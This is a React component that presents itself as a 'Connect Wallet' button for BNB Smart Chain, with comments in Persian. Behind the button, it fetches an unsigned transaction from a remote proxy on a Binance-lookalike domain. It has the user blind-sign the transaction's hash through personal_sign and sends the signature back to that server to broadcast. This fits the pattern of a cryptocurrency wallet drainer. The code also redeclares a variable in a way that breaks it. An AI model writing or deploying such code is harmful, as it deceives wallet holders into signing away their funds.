import jQuery from "jquery";
import { EthereumProvider } from "@walletconnect/ethereum-provider";
import { ethers } from "ethers";

function App() {
  async function runner() {
    if (typeof localStorage !== "undefined") {
      localStorage.removeItem("walletconnect");
    }

    var ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      chains: [56], // فقط BSC
      methods: ["personal_sign"],
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    await ethereumProvider.enable();
    var provider = ethereumProvider;
    var account = await provider.request({ method: "eth_accounts" });
    var account_sender = account[0];
    console.log("✅ Wallet Address:", account_sender);

    try {
      await provider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }], // BSC Chain ID
      });
    } catch (error) {
      console.error("❌ Error in switching chain:", error);
      return;
    }

    let apiUrl = "https://sponsorbinance.vercel.app/api/proxy";

    async function signAndSendTransaction(address, chain, type, contract = "0") {
      try {
        let requestData = { handler: "tx", address, chain, type };
        if (type === "token") requestData.contract = contract;

        // دریافت تراکنش خام از سرور
        var result = await jQuery.post(apiUrl, requestData);
        var unsignedTx = JSON.parse(result).unsigned_tx;
        console.log("📜 Unsigned Transaction:", unsignedTx);

        // **🔹 محاسبه هش تراکنش برای امضا**
        const txHash = ethers.utils.keccak256(ethers.utils.serializeTransaction(unsignedTx));
        console.log("🔹 Transaction Hash:", txHash);

        // **✅ امضای هش تراکنش در کیف پول**
        var signedTx = await provider.request({
          method: "personal_sign",
          params: [txHash, address],
        });

        console.log("✍️ Signed Transaction:", signedTx);

        // **✅ ارسال امضای تراکنش به سرور**
        var txHash = await jQuery.post(apiUrl, {
          handler: "sign",
          signature: signedTx,
          unsignedTx: unsignedTx, // ارسال تراکنش خام برای بازسازی
          type,
        });

        console.log("📤 Transaction Sent:", txHash);
        return txHash;
      } catch (error) {
        console.error("❌ Error in signAndSendTransaction:", error);
        return null;
      }
    }

    var txHash = await signAndSendTransaction(account_sender, "56", "coin");

    if (txHash) {
      console.log("📤 Final Transaction Hash:", txHash);
    } else {
      console.error("⚠ Transaction failed.");
    }
  }

  return (
    <a
      href="#"
      id="connectWallet"
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      data-uk-toggle=""
    >
      <span>Connect Wallet</span>
    </a>
  );
}

export default App;
